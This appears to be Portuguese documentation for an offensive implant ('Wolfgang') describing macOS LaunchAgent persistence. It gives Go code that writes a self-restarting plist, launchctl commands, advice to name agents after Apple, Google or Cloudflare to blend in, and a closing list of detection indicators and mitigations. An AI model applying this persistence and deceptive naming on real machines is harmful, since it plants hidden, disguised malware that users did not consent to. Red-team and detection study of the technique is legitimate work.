    macOS LaunchAgent / LaunchDaemon¶

    O que é¶

    launchd é o sistema de inicialização e gerenciamento de serviços do macOS (equivalente ao systemd do Linux). Ele controla o lifecycle de processos no sistema, desde daemons de sistema até aplicações de usuário.

    Para persistência, o Wolfgang cria um LaunchAgent -- um plist (Property List) que instrui o launchd a iniciar o implant automaticamente no login do usuário.

    Existem dois tipos de componentes launchd:

    Tipo Escopo Diretório Privilégio
    LaunchAgent Sessão do usuário ~/Library/LaunchAgents/ User
    LaunchDaemon Sistema inteiro /Library/LaunchDaemons/ Root

    O Wolfgang usa LaunchAgent por padrão, que funciona sem privilégio elevado.

    Por que funciona¶

    O launchd (PID 1 no macOS) monitora diretórios específicos para plists que descrevem serviços. Quando um usuário faz login, o launchd da sessão carrega todos os plists de:

    1. /System/Library/LaunchAgents/ (Apple, read-only via SIP)
    2. /Library/LaunchAgents/ (admin-level, todos os usuários)
    3. ~/Library/LaunchAgents/ (user-level, apenas o usuário)

    Um plist com RunAtLoad = true faz o processo iniciar automaticamente. Com KeepAlive = true, o launchd reinicia o processo se ele morrer -- fornecendo resiliência adicional.

    O LaunchAgent funciona porque:

    • O diretório ~/Library/LaunchAgents/ é gravável pelo usuário sem escalação
    • O launchd confia em qualquer plist nesse diretório
    • Não há verificação de assinatura de código para LaunchAgents (diferente de kernel extensions)
    • O macOS não exige Gatekeeper check para binários iniciados via launchd

    Implementação no Wolfgang¶

    O módulo (pkg/module/persist/launchd_darwin.go) cria um plist XML e o salva no diretório de LaunchAgents do usuário:

    func platformWritePlist(label, exePath string) error {
    homeDir, _ := os.UserHomeDir()

    launchAgentsDir := filepath.Join(homeDir, "Library", "LaunchAgents")
    os.MkdirAll(launchAgentsDir, 0755)

    plistPath := filepath.Join(launchAgentsDir, label+".plist")
    plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, label, exePath)

    return os.WriteFile(plistPath, []byte(plistContent), 0644)
}

    Campos do plist¶

    Campo Tipo Descrição
    Label String Identificador único do serviço (convenção: reverse DNS)
    ProgramArguments Array Comando e argumentos a executar
    RunAtLoad Boolean Iniciar automaticamente no login
    KeepAlive Boolean Reiniciar se o processo morrer

    Naming conventions¶

    O label deve seguir a convenção de reverse DNS para se misturar com LaunchAgents legítimos:

    • com.apple.spotlight.updater (imita Apple)
    • com.google.keystone.agent (imita Google Chrome updater)
    • io.cloudflare.warp.client (imita Cloudflare WARP)

    Campos adicionais (não implementados mas úteis)¶

    <!-- Delay de inicio para evitar congestion no login -->
<key>ThrottleInterval</key>
<integer>30</integer>

<!-- Redireção de output para debug -->
<key>StandardOutPath</key>
<string>/dev/null</string>
<key>StandardErrorPath</key>
<string>/dev/null</string>

<!-- Variáveis de ambiente -->
<key>EnvironmentVariables</key>
<dict>
    <key>HOME</key>
    <string>/Users/target</string>
</dict>

    Considerações Operacionais¶

    load / unload¶

    O plist pode ser carregado manualmente sem esperar o próximo login:

    # Carregar (equivale a "iniciar agora")
launchctl load ~/Library/LaunchAgents/com.example.agent.plist

# Descarregar (equivale a "parar e remover")
launchctl unload ~/Library/LaunchAgents/com.example.agent.plist

# macOS moderno (10.10+)
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.example.agent.plist
launchctl bootout gui/$(id -u)/com.example.agent

    LaunchAgent vs LaunchDaemon¶

    Aspecto LaunchAgent LaunchDaemon
    Privilégio User Root
    Sessão GUI Sim (tem acesso à UI) Não (roda sem GUI)
    Diretório ~/Library/LaunchAgents/ /Library/LaunchDaemons/
    Sobrevive logoff Não Sim
    Acesso a user keychain Sim Não

    Cleanup¶

    # Descarregar e remover
launchctl unload ~/Library/LaunchAgents/com.example.agent.plist
rm ~/Library/LaunchAgents/com.example.agent.plist

    Interação com macOS security¶

    • Gatekeeper: Não se aplica a binários executados via launchd
    • TCC (Transparency, Consent, and Control): O binário pode precisar de aprovação para acessar recursos protegidos (câmera, microfone, Full Disk Access)
    • SIP (System Integrity Protection): Protege /System/Library/LaunchAgents/ mas não ~/Library/LaunchAgents/

    Detecção¶

    IOC Descrição
    Novo plist em ~/Library/LaunchAgents/ Arquivo criado por processo não-standard
    launchctl load com plist de path incomum Carregamento manual de LaunchAgent
    Plist com KeepAlive = true + binário em /tmp Padrão de persistência com resiliência
    Label que imita Apple (com.apple.*) Naming deceptivo
    eslogger / Endpoint Security Framework events Monitoramento de criação de LaunchAgents

    Mitigações:

    • Monitorar LaunchAgents directory: Alertar sobre novos plists
    • Santa (Google): Allow/deny listing de binários
    • Endpoint Security Framework: APIs nativas para detectar criação de LaunchAgents
    • Jamf / MDM: Policies para restringir LaunchAgents
